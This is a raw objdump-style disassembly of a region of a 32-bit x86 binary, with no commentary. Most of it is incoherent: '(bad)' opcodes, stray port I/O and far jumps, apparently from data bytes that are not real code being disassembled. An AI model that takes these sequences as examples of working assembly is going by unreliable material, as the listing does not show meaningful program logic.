  415e4b:	dec    ebp
  415e4c:	inc    edx
  415e4d:	mov    al,ds:0xdc0335c5
  415e52:	(bad)  
  415e53:	int    0x3
  415e55:	adc    eax,0x637e98a1
  415e5a:	dec    eax
  415e5b:	lock cmp al,0xc0
  415e5e:	sub    DWORD PTR [esi],edi
  415e60:	push   eax
  415e61:	fisttp DWORD PTR [edx-0x25]
  415e64:	xchg   ecx,eax
  415e65:	xor    eax,0x63842de7
  415e6a:	push   ss
  415e6b:	push   0x77
  415e6d:	stos   DWORD PTR es:[edi],eax
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x23]
  415ee3:	push   esp
  415ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee5:	add    BYTE PTR [edi-0x14],ah
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	sub    BYTE PTR [edi+edx*4+0x1df302b4],0xde
  415ef6:	jbe    0x415e7c
  415ef8:	lds    ebx,FWORD PTR [esi]
  415efa:	adc    ebp,DWORD PTR [ebx+0x245b04be]
  415f00:	xchg   esi,eax
  415f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f02:	cmp    ebp,DWORD PTR [edi+esi*4+0x43f4b46d]
  415f09:	jae    0x415efc
  415f0b:	cmp    ch,BYTE PTR [edi-0x24]
  415f0e:	fst    QWORD PTR [eax+0x2e]
  415f11:	inc    ebx
  415f12:	mov    esp,0x24cc0812
  415f17:	out    0x57,al
  415f19:	mov    DWORD PTR [ecx+0x1707c9ea],esp
  415f1f:	in     al,dx
  415f20:	push   ss
  415f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f22:	adc    al,0x87
  415f24:	push   esp
  415f25:	test   ch,0x15
  415f28:	and    DWORD PTR [ebx+0x68c3bffd],edi
  415f2e:	(bad)  
  415f2f:	and    esp,DWORD PTR [edx+0x4d]
  415f32:	ret    
  415f33:	push   ss
  415f34:	cmp    cl,BYTE PTR [esi+0x44]
  415f37:	or     DWORD PTR ds:0xbad2c829,edi
  415f3d:	lods   al,BYTE PTR ds:[esi]
  415f3e:	xor    eax,0x162fa748
  415f43:	out    0x8d,al
  415f45:	test   BYTE PTR [edi+0x15],0xcc
  415f49:	pop    ds
  415f4a:	push   ss
  415f4b:	push   ds
  415f4c:	jmp    0x3e9e:0x6d03e069
  415f53:	sbb    DWORD PTR [edi],ebx
  415f55:	jno    0x415fd3
  415f57:	int    0x9a
  415f59:	push   esi
  415f5a:	loope  0x415f25
  415f5c:	or     ah,dh
  415f5e:	fmul   QWORD PTR [edx-0x1335470e]
  415f64:	imul   ebp,DWORD PTR [ebp+0x3a],0xffffffae
  415f68:	std    
  415f69:	sbb    al,0xae
  415f6b:	jl     0x415f62
  415f6d:	sbb    BYTE PTR [eax],0xda
  415f70:	mov    gs,WORD PTR [ebp-0x49]
  415f73:	dec    eax
  415f74:	xlat   BYTE PTR ds:[ebx]
  415f75:	(bad)  
  415f76:	lahf   
  415f77:	data16 fidiv WORD PTR [ebx+0x17]
  415f7b:	inc    eax
  415f7c:	iret   
  415f7d:	add    eax,DWORD PTR [edx+0x29]
  415f80:	loop   0x415f77
  415f82:	or     DWORD PTR [edi-0x52e816f2],ecx
  415f88:	xor    eax,0xaf5cc55c
  415f8d:	leave  
  415f8e:	cmp    DWORD PTR [esi+0x7],eax
  415f91:	push   esp
  415f92:	jns    0x415fde
  415f94:	push   ecx
  415f95:	lahf   
  415f96:	jmp    0x415f9e
  415f98:	ja     0x415fb9
  415f9a:	pop    ebx
  415f9b:	stc    
  415f9c:	and    edx,ebp
  415f9e:	push   esp
  415f9f:	ret    0x1fa5
  415fa2:	(bad)  
  415fa3:	aam    0x3f
  415fa5:	sub    edx,DWORD PTR [edi+0x4ec19f42]
  415fab:	ret    
  415fac:	lea    eax,[edi]
  415fae:	out    0x3e,eax
  415fb0:	inc    eax
  415fb1:	mov    es,WORD PTR [eax]
  415fb3:	aad    0xb9
  415fb5:	sub    ah,ah
  415fb7:	out    dx,al
  415fb8:	adc    DWORD PTR [esi+0x64fa4b45],eax
  415fbe:	sbb    eax,0xe6f03255
  415fc3:	cmp    cl,ch
  415fc5:	sbb    DWORD PTR [ebx+0x3e],ecx
  415fc8:	ds cld 
  415fca:	or     DWORD PTR [ecx-0x223336e],esi
  415fd0:	pushf  
  415fd1:	push   edx
  415fd2:	aam    0xa2
  415fd4:	repnz sub eax,0x98b10788
  415fda:	lahf   
  415fdb:	repz mov ebx,0xed67c2c2
  415fe1:	loope  0x415fab
  415fe3:	push   esp
  415fe4:	jl     0x415fd9
  415fe6:	into   
  415fe7:	cmp    DWORD PTR [ebx-0xe],ecx
  415fea:	push   esp
  415feb:	cdq    
  415fec:	fdivr  QWORD PTR [eax+0x0]
	...
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	push   ds
  416063:	loop   0x4160a6
  416065:	mov    ecx,0xed67
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	mov    eax,0x397d629e
  416073:	jmp    0xe8f5a662
  416078:	push   ss
  416079:	test   DWORD PTR [esi-0x49434b0],ebp
  41607f:	pop    ecx
  416080:	push   ebp
  416082:	xor    eax,0xfe8dbc35
  416087:	push   ecx
  416088:	sbb    eax,0xaa6e28ae
  41608d:	xor    dh,BYTE PTR [edi-0x560827ce]
  416093:	inc    ebp
  416094:	cmp    ch,dl
  416096:	mov    ch,0xe1
  416098:	sar    BYTE PTR ds:0x6c21f83d,1
  41609e:	mov    dl,0x3f
  4160a0:	mov    ebx,0xcca11cd8
  4160a5:	arpl   WORD PTR [edx+edi*4],bp
  4160a8:	sub    DWORD PTR [esi-0x2e],edi
  4160ab:	xchg   bh,bl
  4160ad:	mov    eax,ds:0xc5c42293
  4160b2:	lods   al,BYTE PTR ds:[esi]
  4160b3:	pop    ecx
  4160b4:	mov    ds:0xf9362aea,eax
  4160b9:	add    BYTE PTR [ecx+0x5e617659],cl
  4160bf:	call   0x7480682f
  4160c4:	ret    
  4160c5:	cli    
  4160c6:	lock call 0xa9bd3feb
  4160cc:	push   esi
  4160cd:	pop    esp
  4160ce:	div    BYTE PTR [ecx-0x20]
  4160d1:	sahf   
  4160d2:	enter  0x797b,0xf
  4160d6:	xor    eax,0xb0942185
  4160db:	into   
  4160dc:	sub    ch,dh
  4160de:	xchg   ebp,eax
  4160df:	xchg   esp,eax
  4160e0:	push   ecx
  4160e1:	mov    esi,0xdf451cb4
  4160e6:	mov    esi,0x9d44576c
  4160eb:	shl    DWORD PTR [ebp+0x13],1
  4160ee:	icebp  
  4160ef:	sub    bh,BYTE PTR [esi-0x28700589]
  4160f5:	shl    DWORD PTR [ebx],1
  4160f7:	inc    edx
  4160f8:	push   eax
  4160f9:	retf   0xd41
  4160fc:	int    0x8c
  4160fe:	ficomp DWORD PTR ds:0xd88ae275
  416104:	imul   esi,DWORD PTR [edi-0x166d1b00],0xffffff83
  41610b:	test   edi,esi
  41610d:	jp     0x416167
  41610f:	xchg   ecx,eax
  416110:	mov    edx,0x7e30462d
  416115:	or     BYTE PTR [edx-0x4cc0e55f],ah
  41611b:	and    eax,0x32c446e3
  416120:	cmp    edi,0x45538dde
  416126:	fcomp  QWORD PTR [esi+0x53381377]
  41612c:	hlt    
  41612d:	jge    0x4161a4
  41612f:	leave  
  416130:	adc    edi,eax
  416132:	dec    edx
  416133:	xchg   ebx,eax
  416134:	dec    eax
  416135:	mov    al,0x2f
  416137:	jnp    0x41613f
  416139:	mov    al,ds:0x7676a692
  41613e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41613f:	xchg   ebp,eax
  416140:	cwde   
  416141:	sti    
  416142:	daa    
  416143:	mov    ds:0xd19081d2,eax
  416148:	mov    dh,0xd1
  41614a:	xor    al,0x60
  41614c:	and    DWORD PTR [eax-0x112dd440],ebp
  416152:	aaa    
  416153:	addr16 add eax,0x600f11f2
  416159:	mov    ch,BYTE PTR [ebx+0x114ce223]
  41615f:	hlt    
  416160:	cmp    edi,DWORD PTR [edi+0xe7862b3]
  416166:	mov    DWORD PTR [ebx+0x630aa85e],ebp
  41616c:	mov    edx,0xa5
	...
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0x70dc6ef3
  4161e5:	sub    DWORD PTR [edi-0x12],esp
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	push   0x7581daaf
  4161f3:	cld    
  4161f4:	mov    al,0xca
  4161f6:	scas   eax,DWORD PTR es:[edi]
  4161f7:	(bad)  
  4161f8:	jb     0x41623e
  4161fa:	gs cmp ebx,edi
  4161fd:	mov    WORD PTR [esi+0x56ee89e],?
  416203:	push   eax
  416204:	div    BYTE PTR [esi-0x360a9a90]
  41620a:	jl     0x4161bd
  41620c:	retf   0x5270
  41620f:	clc    
  416210:	dec    eax
  416211:	mov    ecx,0x38644fdb
  416216:	dec    ecx
  416217:	mov    esp,ss
  416219:	push   0x1
  41621b:	sbb    eax,0x467826b6
  416220:	push   edi
  416221:	daa    
  416222:	jbe    0x41624a
  416224:	popf   
  416225:	aam    0x86
  416227:	daa    
  416228:	out    0x39,al
  41622a:	adc    eax,0x96399052
  41622f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416230:	jg     0x4161c6
  416232:	mov    WORD PTR [ebx],gs
  416234:	lods   eax,DWORD PTR ds:[esi]
  416235:	mov    ebp,0xfd84c2fe
  41623a:	(bad)  
  41623b:	sar    DWORD PTR [eax+0xc],1
  41623e:	jge    0x416224
  416240:	lods   eax,DWORD PTR ds:[esi]
  416241:	sbb    DWORD PTR [ebx-0x62b0080a],eax
  416247:	repz xor al,0xb8
  41624a:	add    ebx,DWORD PTR [eax+0x2b]
  41624d:	ret    0xa629
  416250:	and    esp,ebp
  416252:	mov    dl,0xda
  416254:	fstp   DWORD PTR [ebx]
  416256:	dec    esp
  416257:	fist   WORD PTR [esi-0x55b7f013]
  41625d:	and    DWORD PTR [ebp+0x65],esi
  416260:	aas    
  416261:	outs   dx,BYTE PTR ds:[esi]
  416262:	push   ebp
  416263:	push   edx
  416264:	push   cs
  416265:	push   esp
  416266:	push   ecx
  416267:	jle    0x4162e6
  416269:	cmp    edx,DWORD PTR ds:0x7647308
  41626f:	rcl    ch,0xbe
  416272:	dec    ebx
  416273:	inc    eax
  416274:	adc    ebx,ebp
  416276:	jle    0x4162d2
  416278:	call   0x688c689b
  41627d:	stc    
  41627e:	fild   QWORD PTR [eax+ebp*1+0x77]
  416282:	mov    edi,0x29f92a6c
  416287:	lods   eax,DWORD PTR ds:[esi]
  416288:	sbb    eax,DWORD PTR [esi-0x5c]
  41628b:	jl     0x4162c6
  41628d:	or     al,0x1d
  41628f:	or     BYTE PTR [ecx],dl
  416291:	aad    0x47
  416293:	rcr    DWORD PTR es:[eax],cl
  416296:	out    0x1,eax
  416298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416299:	in     eax,0x7
  41629b:	dec    esi
  41629c:	push   edi
  41629d:	add    edi,DWORD PTR [ebx-0x5a787dea]
  4162a3:	xchg   edi,eax
  4162a4:	jo     0x416282
  4162a6:	push   ecx
  4162a7:	in     eax,0xd7
  4162a9:	cmp    eax,0xddb247f3
  4162ae:	xchg   esp,eax
  4162af:	dec    eax
  4162b0:	add    eax,0x594e9483
  4162b5:	imul   ebp,DWORD PTR [ecx+0x53],0x77
  4162b9:	xor    bh,BYTE PTR [ebx+esi*2]
  4162bc:	cmp    ecx,DWORD PTR [ebp-0x13f5a403]
  4162c2:	out    dx,al
  4162c3:	add    DWORD PTR [edi],0xb9c2e21d
  4162c9:	ror    DWORD PTR [ebp+0x2ffac95d],0xc6
  4162d0:	xor    al,0x75
  4162d2:	cmp    dl,BYTE PTR [ecx+ecx*8]
  4162d5:	fwait
  4162d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d7:	xchg   ebp,edi
  4162d9:	imul   BYTE PTR [eax+0x56]
  4162dc:	pop    ebx
  4162dd:	xchg   ebp,eax
  4162de:	xchg   edi,eax
  4162df:	xor    al,0x1a
  4162e1:	mov    DWORD PTR [edx],0x4317d4e
  4162e7:	scas   al,BYTE PTR es:[edi]
  4162e8:	(bad)  
  4162ea:	(bad)  
  4162ec:	pop    esi
  4162ed:	sub    eax,DWORD PTR [eax]
	...
  416353:	add    BYTE PTR [eax],al
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x670f:0xad3e26ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	push   0x8a3e9040
  416373:	js     0x4163c0
  416375:	jbe    0x41637e
  416377:	xchg   ebx,eax
  416378:	or     bh,al
  41637a:	jnp    0x4163e8
  41637c:	jmp    0x41632d
  41637e:	(bad)  
  41637f:	lock sbb DWORD PTR [esi-0x2ef27926],edx
  416386:	mov    WORD PTR [ebp+ebp*8-0x4f],ss
  41638a:	or     bh,ah
  41638c:	call   0x9e5f7def
  416391:	sti    
  416392:	cmp    eax,0x4478e3b2
  416397:	fwait
  416398:	or     eax,0xe5eac1ab
  41639d:	pusha  
  41639e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639f:	mov    ds:0xf58cab90,al
  4163a4:	lea    eax,[ecx+0x43]
  4163a7:	and    al,0x1c
  4163a9:	aas    
  4163aa:	mov    edx,0xaf894f4c
  4163af:	enter  0xc387,0x4
  4163b3:	lods   eax,DWORD PTR ds:[esi]
  4163b4:	jbe    0x4163b8
  4163b6:	jne    0x416406
  4163b8:	data16 mov cl,0xf1
  4163bb:	jno    0x41636b
  4163bd:	retf   
  4163be:	jne    0x416420
  4163c0:	popa   
  4163c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c2:	jle    0x4163a9
  4163c4:	xchg   ch,dh
  4163c6:	outs   dx,BYTE PTR ds:[esi]
  4163c7:	(bad)  
  4163c8:	sbb    BYTE PTR [esi-0x2c],dl
  4163cb:	mov    ah,0x67
  4163cd:	cdq    
  4163ce:	retf   0x5979
  4163d1:	cmp    BYTE PTR [ebx+ebp*2],0x10
  4163d5:	xchg   edi,eax
  4163d6:	xor    al,0xcb
  4163d8:	out    dx,al
  4163d9:	jmp    0xaad4ec1f
  4163de:	mov    esp,0xa3e23929
  4163e3:	adc    ebp,DWORD PTR [ebx]
  4163e5:	mov    DWORD PTR ds:0x9f80ed70,esp
  4163eb:	jle    0x41645c
  4163ed:	loop   0x4163ac
  4163ef:	mov    ds:0x53f11da9,eax
  4163f4:	dec    ecx
  4163f5:	cli    
  4163f6:	iret   
  4163f7:	and    BYTE PTR [ecx*2-0x52f7d035],bh
  4163fe:	out    dx,eax
  4163ff:	mov    ds:0x817ea1c3,eax
  416404:	push   ds
  416405:	not    DWORD PTR [edi-0x5]
  416408:	sub    esi,edi
  41640a:	in     al,0xd5
  41640c:	jmp    0xfc00:0xa88d8faa
  416413:	es icebp 
  416415:	and    DWORD PTR [edx-0x1a],eax
  416418:	add    eax,ebp
  41641a:	push   cs
  41641b:	lea    eax,[esi]
  41641d:	inc    esp
  41641e:	sahf   
  41641f:	dec    ebx
  416420:	mov    bh,0x1b
  416422:	or     dh,dl
  416424:	fidiv  DWORD PTR [edi+edx*8+0x29cbec38]
  41642b:	jp     0x4163d2
  41642d:	(bad)  
  41642e:	std    
  41642f:	mov    ecx,eax
  416431:	inc    eax
  416432:	or     ebp,DWORD PTR [ebx+eiz*2]
  416435:	mov    fs,WORD PTR [ecx+edx*2-0x22]
  416439:	add    bh,BYTE PTR [eax+edi*4+0x4f31a32f]
  416440:	and    dl,0xf6
  416443:	in     al,0xd7
  416445:	adc    eax,0xbbf58c8e
  41644a:	and    eax,0xb8775970
  41644f:	rcl    DWORD PTR [eax+0x71a0eef6],0xcd
  416456:	iret   
  416457:	lock lsl ebx,WORD PTR [ecx+0x40a4b881]
  41645f:	add    BYTE PTR [esi+eiz*4-0x60],ah
  416463:	or     eax,0xca0fa714
  416468:	sub    dl,0x40
  41646b:	sub    eax,0x7e6
	...
  4164d4:	add    BYTE PTR [eax],al
  4164d6:	repz inc ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	pop    edi
  4164e3:	jmp    0x41646b
  4164e5:	and    DWORD PTR [edi-0x10],0x0
  4164e9:	add    BYTE PTR [eax],al
  4164eb:	add    DWORD PTR [eax],eax
  4164ed:	add    BYTE PTR [ecx+0x64e75bb],cl
  4164f3:	inc    ebp
  4164f4:	lock sub ebx,DWORD PTR [esi+0x4a]
  4164f8:	pop    edi
  4164f9:	inc    esp
  4164fa:	adc    eax,0xd4649dcb
  4164ff:	lea    edi,[ebx-0x479cbd50]
  416505:	push   ebp
  416506:	xor    dl,BYTE PTR [eax]
  416508:	retf   0x40b4
  41650b:	aad    0xa
  41650d:	popf   
  41650e:	pop    ebx
  41650f:	and    bh,cl
  416511:	jo     0x416533
  416513:	clc    
  416514:	jns    0x416509
  416516:	or     cl,BYTE PTR [eax-0x473b1bbd]
  41651c:	dec    ecx
  41651d:	jne    0x41654c
  41651f:	test   al,0x9c
  416521:	push   es
  416522:	test   BYTE PTR [edi+edx*8-0x1d4be93d],ch
  416529:	mov    dl,0x37
  41652b:	in     al,dx
  41652c:	shl    DWORD PTR [edx-0x56b12b12],1
  416532:	jl     0x416570
  416534:	in     al,0x1b
  416536:	fucom  st(0)
  416538:	xchg   edx,eax
  416539:	jecxz  0x416559
  41653b:	daa    
  41653c:	test   bh,ch
  41653e:	adc    eax,0xc0d346ec
  416544:	sbb    DWORD PTR [ecx+0x60bcba53],esi
  41654a:	lahf   
  41654b:	mov    dl,dl
  41654d:	and    bl,BYTE PTR ds:0x99a28d79
  416553:	push   ss
  416554:	adc    eax,0x107c898a
  416559:	imul   BYTE PTR [ebx+0x363a228f]
  41655f:	jmp    0xcb37:0xf0833bef
  416566:	stos   BYTE PTR es:[edi],al
  416567:	outs   dx,DWORD PTR ds:[esi]
  416568:	xchg   ebx,eax
  416569:	pop    ds
  41656a:	retf   0x38ef
  41656d:	sbb    esi,DWORD PTR [esi]
  41656f:	aaa    
  416570:	or     al,0x9e
  416572:	rol    BYTE PTR [ebp-0x743ebec1],0x5
  416579:	test   eax,0x7f4cdc81
  41657e:	cwde   
  41657f:	div    BYTE PTR [esi+0x70ea0617]
  416585:	outs   dx,DWORD PTR ds:[esi]
  416586:	outs   dx,DWORD PTR ds:[esi]
  416587:	fwait
  416588:	bound  edx,QWORD PTR gs:[edi]
  41658b:	repnz ds cdq 
  41658e:	sbb    al,bl
  416590:	(bad)  
  416592:	ss out dx,al
  416594:	add    eax,0xc55b6958
  416599:	inc    ebp
  41659a:	inc    esi
  41659b:	cmp    cl,BYTE PTR [edx]
  41659d:	push   ebp
  41659e:	pop    ss
  41659f:	jge    0x416530
  4165a1:	icebp  
  4165a2:	pushf  
  4165a3:	adc    DWORD PTR [eax-0x5c3dda3d],ebp
  4165a9:	mov    eax,es:0x65aceb73
  4165af:	add    al,0xf4
  4165b1:	shl    DWORD PTR [esi],cl
  4165b3:	lahf   
  4165b4:	inc    edi
  4165b5:	sub    al,0x7e
  4165b7:	jg     0x41661a
  4165b9:	sahf   
  4165ba:	sub    DWORD PTR [edx],esi
  4165bc:	pop    esi
  4165bd:	fidiv  WORD PTR ds:0x34ab5d8a
  4165c3:	inc    ecx
  4165c4:	dec    edx
  4165c5:	push   ecx
  4165c6:	fld    QWORD PTR [esi-0x25c556d9]
  4165cc:	outs   dx,DWORD PTR ds:[esi]
  4165cd:	imul   esp,DWORD PTR [edx+esi*8-0x51],0xd7fb4e0a
  4165d5:	cmp    BYTE PTR [ebx-0x5a],cl
  4165d8:	nop
  4165d9:	mov    edi,0x6738347d
  4165de:	pushf  
  4165df:	(bad)  
  4165e0:	in     eax,dx
  4165e1:	sar    dl,0xba
  4165e4:	js     0x4165fc
  4165e6:	mov    esi,DWORD PTR [eax-0x13]
  4165e9:	xor    eax,0x60ad7d29
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x2fb04354]
  416663:	mov    BYTE PTR [edi-0x21],0x67
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	mov    ebx,0xb2e4b042
  416673:	ret    0xf804
  416676:	dec    ebx
  416677:	adc    eax,0xa239baa
  41667c:	and    ah,0x5c
  41667f:	sbb    al,0xf9
  416681:	test   al,0xf3
  416683:	dec    esi
  416684:	dec    edi
  416685:	retf   0x52e5
  416688:	call   0xde261c2a
  41668d:	add    dl,ch
  41668f:	(bad)  
  416691:	jp     0x4166a3
  416693:	add    eax,0x442b470c
  416698:	mov    bh,BYTE PTR [edx]
  41669a:	jae    0x4166bd
  41669c:	pop    ss
  41669d:	mov    edi,0x5bb6bf
  4166a2:	sub    BYTE PTR [ecx+0x3fb7d26a],al
  4166a8:	mov    al,ds:0xea4b978c
  4166ad:	(bad)  
  4166ae:	xchg   ecx,eax
  4166af:	inc    eax
  4166b0:	dec    ebx
  4166b1:	adc    al,0x8c
  4166b3:	(bad)  
  4166b5:	mov    es,edi
  4166b7:	mov    dl,0xcd
  4166b9:	cmp    al,0xe1
  4166bb:	sbb    bh,BYTE PTR [eax+0x17]
  4166be:	inc    esi
  4166bf:	pop    ebx
  4166c0:	xor    al,0x66
  4166c2:	inc    DWORD PTR es:[ebp+0x4c8d90a3]
  4166c9:	std    
  4166ca:	iret   
  4166cb:	fwait
  4166cc:	dec    eax
  4166cd:	xchg   BYTE PTR [esi-0x57],ch
  4166d0:	not    DWORD PTR [edx-0x42d8ab91]
  4166d6:	cmp    al,0xd6
  4166d8:	ret    0xe6c9
  4166db:	mov    ebx,0x344d8f18
  4166e0:	fcom   DWORD PTR [ecx+0x12]
  4166e3:	es sbb esi,edx
  4166e6:	sahf   
  4166e7:	lds    esp,FWORD PTR [edi]
  4166e9:	fcmovu st,st(7)
  4166eb:	addps  xmm0,XMMWORD PTR ds:0x76e057f9
  4166f2:	not    BYTE PTR [ebp-0x25]
  4166f5:	dec    ebx
  4166f6:	mov    eax,ds:0xa6e61d55
  4166fb:	or     BYTE PTR [eax-0x264416e3],cl
  416701:	xchg   BYTE PTR [ebp+ebx*2-0x26],ah
  416705:	and    BYTE PTR [esi+eax*8],ch
  416708:	mov    eax,ds:0x1d324cbc
  41670d:	lock jecxz 0x416777
  416710:	xor    esi,DWORD PTR [ebx-0x704a87f7]
  416716:	pop    ebp
  416717:	push   cs
  416718:	push   ebp
  416719:	rcr    BYTE PTR [esi],0xc
  41671c:	ss mov ch,0x54
  41671f:	dec    edi
  416720:	inc    edi
  416721:	outs   dx,BYTE PTR ds:[esi]
  416722:	popf   
  416723:	pop    esi
  416724:	mov    eax,0xeabae85f
  416729:	and    bh,BYTE PTR [ebx]
  41672b:	dec    esi
  41672c:	test   eax,0xc8407a1b
  416731:	push   ecx
  416732:	pop    edx
  416733:	adc    ah,BYTE PTR [edi]
  416735:	lds    ecx,FWORD PTR [edx]
  416737:	pushf  
  416738:	xchg   ebx,eax
  416739:	fsubr  QWORD PTR [eax-0x29a9999b]
  41673f:	test   al,0x7d
  416741:	cmp    DWORD PTR [esi-0x73],edi
  416744:	sbb    eax,0x7884c13f
  416749:	cmp    esi,ebp
  41674b:	mov    WORD PTR [ebp-0x2729486f],es
  416751:	fsub   QWORD PTR [eax+0x3612f368]
  416757:	and    eax,0x8e4c689e
  41675c:	pop    ecx
  41675d:	in     al,0x94
  41675f:	data16 mov bl,0x80
  416762:	add    cl,BYTE PTR [eax+0x1]
  416765:	shl    edi,cl
  416767:	outs   dx,BYTE PTR ds:[esi]
  416768:	(bad)  
  416769:	rcr    DWORD PTR [esp+eiz*2],1
  41676c:	jmp    0x416810
	...
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	push   esi
  4167e3:	jns    0x416818
  4167e5:	aam    0x67
  4167e7:	repnz add BYTE PTR [eax],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	out    dx,al
  4167ef:	popa   
  4167f0:	xchg   ebx,eax
  4167f1:	cmp    eax,0xdcb6c981
  4167f6:	xor    dl,BYTE PTR [ebp+0x54f2cc81]
  4167fc:	sub    DWORD PTR [edi-0x7c],esi
  4167ff:	repnz mov ebp,0x2647c4fe
  416805:	mov    dh,dl
  416807:	jbe    0x416803
  416809:	lods   al,BYTE PTR ds:[esi]
  41680a:	(bad)  
  41680b:	mov    al,0x8f
  41680d:	jl     0x41683c
  41680f:	jg     0x416840
  416811:	jne    0x41683d
  416813:	dec    ecx
  416814:	mov    ebx,0x313f1a4
  416819:	mov    bh,0x7c
  41681b:	pop    ebp
  41681c:	dec    esp
  41681d:	cld    
  41681e:	inc    BYTE PTR [eax]
  416820:	sub    DWORD PTR [ebx-0x54],0x34
  416824:	adc    al,0xc3
  416826:	mov    esi,0xd4cdc97
  41682b:	nop
  41682c:	(bad)  [edi+0x3b547a00]
  416832:	jns    0x4167cd
  416834:	jns    0x416833
  416836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416837:	cmp    al,0x6f
  416839:	or     DWORD PTR [edi],ebx
  41683b:	sub    al,0x28
  41683d:	sub    al,0x12
  41683f:	rcl    BYTE PTR [edx-0x4c],cl
  416842:	cmc    
  416843:	push   edi
  416844:	test   al,0xaa
  416846:	add    al,0xb8
  416848:	inc    edi
  416849:	stos   BYTE PTR es:[edi],al
  41684a:	out    0x52,al
  41684c:	cli    
  41684d:	retf   0x1897
  416850:	mov    al,0xcd
  416852:	mov    bh,0x60
  416854:	stc    
  416855:	sub    BYTE PTR ds:0x3c077885,0x53
  41685c:	clc    
  41685d:	adc    al,0xa1
  41685f:	pop    edi
  416860:	xor    edi,DWORD PTR [esi]
  416862:	mov    fs:0xbbe21ede,al
  416868:	mov    al,ds:0x58d91983
  41686d:	leave  
  41686e:	push   edi
  41686f:	mov    dh,0xb6
  416871:	out    dx,eax
  416872:	mov    fs,ecx
  416874:	xchg   edx,eax
  416875:	test   al,0x53
  416877:	sub    BYTE PTR [ecx-0x4b],dl
  41687a:	mov    ebx,0x38bc33ff
  41687f:	or     DWORD PTR [esi],edx
  416881:	dec    esi
  416882:	jl     0x4168a6
  416884:	xor    al,BYTE PTR [edx-0x4ec6e75e]
  41688a:	dec    ebp
  41688b:	lock inc cx
  41688e:	jge    0x41690d
  416890:	mov    bh,0xc4
  416892:	frstor [ecx+edx*4+0x63]
  416896:	mov    cl,0x5f
  416898:	inc    edi
  416899:	dec    eax
  41689a:	jb     0x416861
  41689c:	jle    0x416917
  41689e:	pop    eax
  41689f:	push   edx
  4168a0:	pop    edx
  4168a1:	loope  0x41689e
  4168a3:	jecxz  0x416906
  4168a5:	in     al,dx
  4168a6:	ret    0x220f
  4168a9:	lea    ecx,[eax+edi*4]
  4168ac:	adc    ecx,DWORD PTR [esi-0x5a]
  4168af:	and    DWORD PTR [ecx],ecx
  4168b1:	shl    DWORD PTR [edx*1+0x263b3a0b],1
  4168b8:	or     ebx,DWORD PTR [eax]
  4168ba:	push   edi
  4168bb:	jle    0x4168c6
  4168bd:	inc    edx
  4168be:	dec    esi
  4168bf:	bound  edi,QWORD PTR [esi+eax*8+0x34]
  4168c3:	mov    dh,0xa9
  4168c5:	lods   eax,DWORD PTR ds:[esi]
  4168c6:	inc    edx
  4168c7:	pop    edi
  4168c8:	aas    
  4168c9:	outs   dx,DWORD PTR ds:[esi]
  4168ca:	lods   eax,DWORD PTR ds:[esi]
  4168cb:	xor    BYTE PTR [eax-0x61],dh
  4168ce:	popf   
  4168cf:	fwait
  4168d0:	push   ss
  4168d1:	jp     0x4168c4
  4168d3:	ret    
  4168d4:	fwait
  4168d5:	sti    
  4168d6:	sahf   
  4168d7:	jbe    0x59c00562
  4168dd:	pop    ebx
  4168de:	mov    al,ds:0xcc193026
  4168e3:	inc    ebx
  4168e4:	scas   eax,DWORD PTR es:[edi]
  4168e5:	lods   eax,DWORD PTR ds:[esi]
  4168e6:	jbe    0x4168da
  4168e8:	push   esi
  4168e9:	jg     0x416936
  4168eb:	mov    ah,0x3f
  4168ed:	xchg   esp,eax
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x426b73b9
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	les    edx,FWORD PTR [esi-0x40]
  416971:	xchg   ebp,eax
